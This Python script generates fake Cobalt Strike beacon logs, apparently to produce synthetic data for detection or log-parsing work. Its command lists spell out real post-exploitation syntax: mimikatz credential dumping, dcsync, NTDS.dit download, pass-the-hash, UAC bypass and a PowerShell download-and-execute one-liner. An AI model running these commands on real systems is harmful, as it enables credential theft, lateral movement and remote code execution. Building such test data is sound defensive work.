#!/usr/bin/env python3

import random
import datetime
import argparse
import os
from typing import List, Dict, Tuple

# Define possible domains, usernames, computer names, and IP addresses
DOMAINS = ["WORKGROUP", "CORP", "CONTOSO", "ACME", "LOCAL", "INTERNAL", "NT AUTHORITY", 
           "NT SERVICE", "BUILTIN", "APPLICATION PACKAGE AUTHORITY", "WINDOW MANAGER", 
           "TERMINAL SERVER USER", "LOCAL SERVICE", "NETWORK SERVICE"]
USERNAMES = ["admin", "administrator", "jsmith", "jdoe", "asmith", "mjones", "bwilson", 
             "rjohnson", "slee", "mgarcia", "jmiller", "pwilliams", "kbrown", "jtaylor", 
             "aanderson", "mthomas", "rjackson", "dwhite", "bharris", "smartin", "system",
             "SYSTEM", "NETWORK SERVICE", "LOCAL SERVICE", "svc_sql", "svc_iis", "svc_exchange",
             "app_pool", "asp.net v4.0", "DefaultAppPool", "Guest", "IUSR", "svchost"]
COMPUTER_NAMES = ["DESKTOP-PC1", "DESKTOP-PC2", "LAPTOP-01", "LAPTOP-02", "WORKSTATION1",
                  "WORKSTATION2", "FILESERVER", "FILESERVER2", "DC01", "DC02", "EXCHSRV01",
                  "WEBSERVER", "APPSRV01", "DBSERVER", "SHAREPOINT", "PRINTSERVER",
                  "SQLSERVER", "ADFSSERVER", "SCCM01", "BACKUP01"]
IP_RANGES = ["192.168.1", "10.0.0", "172.16.0", "10.10.10"]

# Commands that might be seen in Cobalt Strike logs
SIMPLE_COMMANDS = [
    "sleep {0}",
    "checkin",
    "shell whoami",
    "shell hostname",
    "shell ipconfig",
    "shell ifconfig",
    "shell net user",
    "shell net localgroup administrators",
    "shell net group \"Domain Admins\" /domain",
    "shell systeminfo",
    "shell tasklist",
    "shell query user",
    "shell netstat -ano",
    "shell dir C:\\",
    "shell ls -la /tmp",
    "shell type C:\\Windows\\win.ini",
    "shell cat /etc/passwd",
    "pwd",
    "cd C:\\Users",
    "cd C:\\Users\\{0}",
    "cd /home/{0}",
    "ls",
    "ls C:\\Users",
    "ls C:\\Windows\\System32",
    "ls /etc",
    "drives",
    "ps",
    "ping {0}",
    "shell ping -c 4 {0}",
    "shell nslookup {0}",
    "shell curl -s {0}",
    "shell wget -q {0}"
]

ADVANCED_COMMANDS = [
    "hashdump",
    "mimikatz sekurlsa::logonpasswords",
    "mimikatz lsadump::sam",
    "mimikatz privilege::debug",
    "mimikatz token::elevate",
    "execute-assembly C:\\Tools\\Seatbelt.exe -group=system",
    "execute-assembly C:\\Tools\\SharpHound.exe -c All",
    "execute-assembly C:\\Tools\\Rubeus.exe kerberoast",
    "execute-assembly C:\\Tools\\SharpView.exe Get-DomainUser",
    "execute-assembly C:\\Tools\\Certify.exe find /vulnerable",
    "jump psexec {0} {1}",
    "jump psexec_psh {0} {1}",
    "jump winrm {0} {1}",
    "jump wmi {0} {1}",
    "runasadmin {0}",
    "spawnas {0} {1} {2}",
    "ssh {0} {1} \"{2}\"",
    "powershell Get-Service",
    "powershell Get-Process | Where-Object {{$_.CPU -gt 10}}",
    "powershell Get-ADUser -Filter * -Properties LastLogonDate | Where-Object {{$_.LastLogonDate -lt (Get-Date).AddDays(-90)}}",
    "powershell Get-ADComputer -Filter 'operatingsystem -like \"*server*\"' -Properties * | Select-Object Name,OperatingSystem", 
    "powershell Invoke-Command -ComputerName {0} -ScriptBlock {{systeminfo}}",
    "powershell Invoke-WebRequest -Uri http://{0}/payload.ps1 -OutFile C:\\Windows\\Temp\\payload.ps1",
    "powershell Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('http://{0}/script.ps1'))",
    "powerpick Get-NetLocalGroup",
    "dcsync {0} {1}",
    "download C:\\Users\\{0}\\Documents\\passwords.txt",
    "download C:\\Windows\\NTDS\\NTDS.dit",
    "upload C:\\Users\\{0}\\malware.exe",
    "timestomp C:\\Windows\\Temp\\payload.exe \"01/01/2025 12:00:00\"",
    "screenshot",
    "keylogger",
    "pth {0}",  # Changed from "pth {0} {1}" to "pth {0}"
    "getsystem",
    "steal_token {0}",
    "make_token {0}\\{1} {2}",
    "rev2self",
    "spawn {0}",
    "inject {0} {1}",
    "rportfwd {0} {1} {2}",
    "socks 1080",
    "browserpivot {0} {1}",
    "argue {0}",
    "bypassuac {0}",
    "elevate {0}"
]

# Generate random IPs based on the ranges
def random_ip() -> str:
    ip_range = random.choice(IP_RANGES)
    return f"{ip_range}.{random.randint(1, 254)}"

# Generate random domain and username pair
def random_user() -> Tuple[str, str]:
    domain = random.choice(DOMAINS)
    
    # For NT AUTHORITY and similar domains, use specific accounts
    if domain == "NT AUTHORITY":
        username = random.choice(["SYSTEM", "LOCAL SERVICE", "NETWORK SERVICE", "ANONYMOUS LOGON", 
                                  "Authenticated Users", "IUSR", "IWAM", "INTERACTIVE"])
    elif domain == "NT SERVICE":
        username = random.choice(["TrustedInstaller", "wuauserv", "msiserver", "lanmanserver", 
                                 "WdiServiceHost", "WpnService", "ShellHWDetection"])
    elif domain == "BUILTIN":
        username = random.choice(["Administrators", "Users", "Guests", "Power Users", 
                                 "Backup Operators", "Remote Desktop Users"])
    elif domain == "APPLICATION PACKAGE AUTHORITY":
        username = random.choice(["ALL APPLICATION PACKAGES", "ALL RESTRICTED APPLICATION PACKAGES"])
    elif domain == "LOCAL SERVICE" or domain == "NETWORK SERVICE":
        username = ""  # These are typically shown without a username part
    else:
        username = random.choice(USERNAMES)
    
    return domain, username

# Generate a random computer name
def random_computer() -> str:
    return random.choice(COMPUTER_NAMES)

    # Format a command with parameters
def format_command(command: str) -> str:
    # Count the number of placeholders in the command
    placeholder_count = command.count("{")
    
    if placeholder_count > 0:
        # Prepare arguments based on command type
        args = []
        
        if "jump" in command:
            # Handle jump commands with two parameters: target and method
            computer = random_computer()
            method = random.choice(["SMB", "TCP", "HTTP"])
            args = [computer, method]
        elif "spawnas" in command:
            # Handle spawnas with three parameters: user, password, and binary
            domain, username = random_user()
            args = [f"{domain}\\{username}", "Password123!", random.choice(["cmd.exe", "powershell.exe"])]
        elif "ssh" in command:
            # Handle SSH with IP, username, and command
            args = [random_ip(), random.choice(USERNAMES),
                   random.choice(["ls -la", "whoami", "id", "cat /etc/passwd", "find / -perm -4000 -type f"])]
        elif "ping" in command or "nslookup" in command or "curl" in command or "wget" in command:
            # Handle networking commands with IP
            args = [random_ip()]
        elif "download" in command and "\\{0}\\" in command or "upload" in command and "\\{0}\\" in command:
            # Handle file operations with username
            args = [random.choice(USERNAMES)]
        elif "cd" in command and ("\\{0}" in command or "/{0}" in command):
            # Handle directory navigation with username
            args = [random.choice(USERNAMES)]
        elif "sleep" in command:
            # Handle sleep with seconds
            args = [random.choice([30, 60, 120, 300])]
        elif "dcsync" in command:
            # Handle dcsync with domain and username
            domain, username = random_user()
            args = [domain, username]
        elif "make_token" in command:
            # Handle make_token with domain, username, and password
            domain, username = random_user()
            args = [domain, username, "Password123!"]
        elif "bypassuac" in command or "elevate" in command:
            # Handle UAC bypass with method
            args = [random.choice(["wmi", "token-duplication", "uac-token-duplication", "svc-exe"])]
        elif "inject" in command:
            # Handle process injection with PID and arch
            args = [random.randint(1000, 9999), random.choice(["x64", "x86"])]
        elif "rportfwd" in command:
            # Handle port forwarding with port, host, and port
            args = [random.randint(1024, 65535), random_ip(), random.randint(1024, 65535)]
        elif "browserpivot" in command:
            # Handle browser pivot with PID and type
            args = [random.randint(1000, 9999), random.choice(["ie", "firefox", "chrome"])]
        elif "pth" in command or "steal_token" in command or "spawn" in command:
            # Handle token commands with PID
            args = [random.randint(1000, 9999)]
        elif "argue" in command:
            # Handle argue with command
            args = [random.choice(["netstat -anop TCP", "tasklist /v", "whoami /groups"])]
        elif "powershell Invoke-Command" in command:
            # Handle remote command execution
            args = [random_computer()]
        elif "powershell Invoke-WebRequest" in command or "powershell Set-ExecutionPolicy" in command:
            # Handle web requests with server IP
            args = [random_ip()]
        else:
            # Default case: just use a username or IP based on the command context
            if any(term in command for term in ["ping", "curl", "wget", "http", "server"]):
                args = [random_ip()]
            else:
                args = [random.choice(USERNAMES)]
            
        # Fill in with enough arguments to satisfy all placeholders
        while len(args) < placeholder_count:
            if len(args) == 0:
                args.append(random.choice(USERNAMES))
            elif len(args) == 1:
                # Second arg is often an IP
                args.append(random_ip())
            else:
                # Other args could be various things
                options = [
                    random.choice(USERNAMES),
                    random_ip(),
                    random_computer(),
                    str(random.randint(1000, 9999)),
                    random.choice(["x64", "x86", "cmd.exe", "powershell.exe"])
                ]
                args.append(random.choice(options))
            
        # Format the command with all arguments
        try:
            formatted = command.format(*args)
            return formatted
        except Exception as e:
            # If formatting fails, return a simplified version of the command
            return command.split("{")[0].strip()
    else:
        return command

    # Generate a random beacon log entry
def generate_beacon_entry(beacon_id: int, domain: str, username: str, hostname: str, 
                          timestamp: datetime.datetime) -> List[Dict[str, str]]:
    entries = []
    time_str = timestamp.strftime("%H:%M:%S")
    
    # Choose either a simple or advanced command with 30% chance of advanced
    if random.random() < 0.3:
        command_template = random.choice(ADVANCED_COMMANDS)
    else:
        command_template = random.choice(SIMPLE_COMMANDS)
    
    # Process the command template to replace all placeholders
    command = format_command(command_template)
    
    # If any placeholders remain, try a different command
    if "{" in command and "}" in command:
        # Fallback to a simple command with no placeholders
        fallback_commands = [cmd for cmd in SIMPLE_COMMANDS if "{" not in cmd]
        if fallback_commands:
            command = random.choice(fallback_commands)
        else:
            command = "shell whoami"  # Ultimate fallback
    
    # Prepare the user string based on domain
    if domain in ["NT AUTHORITY", "NT SERVICE", "LOCAL SERVICE", "NETWORK SERVICE"] and not username:
        # For these special cases, just use the domain as the full user
        user_str = domain
    else:
        # Normal case: domain\username
        user_str = f"{domain}\\{username}"
    
    # Initial command entry
    entries.append({
        "time": time_str,
        "beacon_id": beacon_id,
        "user": user_str,
        "host": hostname,
        "command": command,
        "type": "command"
    })
    
    # Add task entry for certain commands
    if any(cmd in command.lower() for cmd in ["hashdump", "mimikatz", "screenshot", "keylogger", "dcsync"]):
        entries.append({
            "time": (timestamp + datetime.timedelta(seconds=random.randint(1, 5))).strftime("%H:%M:%S"),
            "beacon_id": beacon_id,
            "message": f"Beacon {beacon_id} tasked to {command.split()[0]}",
            "type": "task"
        })
    
            # Add output for most commands
    if not any(cmd in command.lower() for cmd in ["sleep", "checkin", "cd", "exit", "screenshot", "bypassuac", "elevate"]):
        output_time = timestamp + datetime.timedelta(seconds=random.randint(2, 7))
        output_time_str = output_time.strftime("%H:%M:%S")
        
        # Simple dummy output based on command type
        if "whoami" in command:
            # Format the whoami output based on the domain type
            if domain in ["NT AUTHORITY", "NT SERVICE"]:
                if username:
                    output = f"{domain}\\{username}"
                else:
                    output = domain
            elif domain in ["LOCAL SERVICE", "NETWORK SERVICE"]:
                output = domain
            else:
                output = f"{domain}\\{username}"
        elif "hostname" in command:
            output = hostname
        elif "ipconfig" in command or "ifconfig" in command:
            output = f"Ethernet adapter Ethernet0:\n\n   IPv4 Address. . . . . . . . . . . : {random_ip()}\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : {random_ip().rsplit('.', 1)[0]}.1"
        elif "net user" in command:
            output = f"User accounts for \\\\{hostname}\n\n-------------------------------------------------------------------------------\n{username}                    Administrator            Guest\nThe command completed successfully."
        elif "ls" in command or "dir" in command:
            output = " Size     Type    Last Modified         Name\n ----     ----    -------------         ----\n          dir     02/10/2025 12:32:15   Users\n          dir     01/15/2025 09:15:42   Windows\n          dir     03/01/2025 10:25:33   Program Files\n          dir     03/01/2025 10:25:33   Program Files (x86)"
        elif "hashdump" in command:
            output = f"Received {random.randint(3, 10)} hashes"
        elif "mimikatz" in command:
            output = f"Authentication Id : 0 ; {random.randint(100000, 999999)}\nSession           : Interactive from 2\nUser Name         : {username}\nDomain            : {domain}\nLogon Server      : {hostname}\nLogon Time        : 3/10/2025 12:00:01 AM\nSID               : S-1-5-21-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(1000000000, 9999999999)}-{random.randint(500, 999)}\n        msv :\n         [00000003] Primary\n         * Username : {username}\n         * Domain   : {domain}\n         * NTLM     : {format(random.getrandbits(128), 'x')}"
        elif "powershell" in command:
            if "Get-ADUser" in command:
                output = "Name                 LastLogonDate        \n----                 -------------        \nguest                                    \nkrbtgt                                   \nbackup_admin         1/5/2025 3:45:21 PM \ntest_account         12/1/2024 9:30:15 AM"
            elif "Get-ADComputer" in command:
                output = "Name         OperatingSystem         \n----         ---------------         \nDC01         Windows Server 2019 Standard\nFILESERVER2  Windows Server 2016 Standard\nEXCHSRV01    Windows Server 2016 Standard"
            elif "systeminfo" in command or "Invoke-Command" in command:
                output = f"Host Name:                 {hostname}\nOS Name:                   Microsoft Windows Server 2019 Standard\nOS Version:                10.0.17763 N/A Build 17763\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform"
            else:
                output = "Command executed successfully."
        else:
            output = "Command executed successfully."
        
        entries.append({
            "time": output_time_str,
            "beacon_id": beacon_id,
            "message": f"Beacon {beacon_id} received output:\n{output}",
            "type": "output"
        })
    
    return entries

# Format and write entries to the log file
def write_beacon_log(entries: List[Dict[str, str]], output_file: str) -> None:
    with open(output_file, 'w') as f:
        for entry in entries:
            if entry["type"] == "command":
                line = f"[{entry['time']}] Beacon {entry['beacon_id']} ({entry['user']}@{entry['host']}): {entry['command']}"
            else:
                line = f"[{entry['time']}] {entry['message']}"
            f.write(line + "\n")

def generate_beacon_log(num_beacons: int, num_entries: int, output_dir: str) -> None:
    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    
    # Create a date directory for today
    today = datetime.datetime.now()
    date_dir = os.path.join(output_dir, today.strftime("%Y-%m-%d"))
    os.makedirs(date_dir, exist_ok=True)
    
    # Initialize beacons with random users and computer names
    beacons = []
    for i in range(num_beacons):
        beacon_id = random.randint(1000, 9999)
        domain, username = random_user()
        hostname = random_computer()
        beacons.append((beacon_id, domain, username, hostname))
    
    # Generate entries for each beacon
    all_entries = []
    start_time = datetime.datetime.now().replace(hour=0, minute=0, second=0)
    
    for _ in range(num_entries):
        # Randomly select a beacon
        beacon = random.choice(beacons)
        beacon_id, domain, username, hostname = beacon
        
        # Generate a timestamp
        timestamp = start_time + datetime.timedelta(seconds=len(all_entries) * random.randint(30, 300))
        
        # Generate entries for this beacon
        beacon_entries = generate_beacon_entry(beacon_id, domain, username, hostname, timestamp)
        all_entries.extend(beacon_entries)
        
        # 5% chance to check in a new beacon
        if random.random() < 0.05 and len(beacons) < num_beacons * 2:
            new_beacon_id = random.randint(1000, 9999)
            new_domain, new_username = random_user()
            new_hostname = random_computer()
            new_beacon = (new_beacon_id, new_domain, new_username, new_hostname)
            beacons.append(new_beacon)
            
            checkin_time = timestamp + datetime.timedelta(seconds=random.randint(10, 30))
            checkin_time_str = checkin_time.strftime("%H:%M:%S")
            
            all_entries.append({
                "time": checkin_time_str,
                "beacon_id": new_beacon_id,
                "message": f"Beacon {new_beacon_id} ({new_domain}\\{new_username}@{new_hostname}) checked in",
                "type": "checkin"
            })
        
        # 2% chance for a beacon to exit
        if random.random() < 0.02 and len(beacons) > 1:
            exit_beacon = random.choice(beacons)
            beacons.remove(exit_beacon)
            
            exit_time = timestamp + datetime.timedelta(seconds=random.randint(10, 30))
            exit_time_str = exit_time.strftime("%H:%M:%S")
            
            all_entries.append({
                "time": exit_time_str,
                "beacon_id": exit_beacon[0],
                "user": f"{exit_beacon[1]}\\{exit_beacon[2]}",
                "host": exit_beacon[3],
                "command": "exit",
                "type": "command"
            })
            
            all_entries.append({
                "time": (exit_time + datetime.timedelta(seconds=random.randint(1, 3))).strftime("%H:%M:%S"),
                "beacon_id": exit_beacon[0],
                "message": f"Beacon {exit_beacon[0]} exited",
                "type": "exit"
            })
    
    # Sort all entries by timestamp
    all_entries.sort(key=lambda entry: entry["time"])
    
    # Write to file
    output_file = os.path.join(date_dir, f"beacon_{random.randint(100000, 999999)}.log")
    write_beacon_log(all_entries, output_file)
    print(f"Generated log file: {output_file}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Generate Cobalt Strike beacon logs.')
    parser.add_argument('--beacons', type=int, default=3, help='Number of initial beacons')
    parser.add_argument('--entries', type=int, default=100, help='Number of main command entries')
    parser.add_argument('--output', type=str, default='logs', help='Output directory')
    args = parser.parse_args()
    
    generate_beacon_log(args.beacons, args.entries, args.output)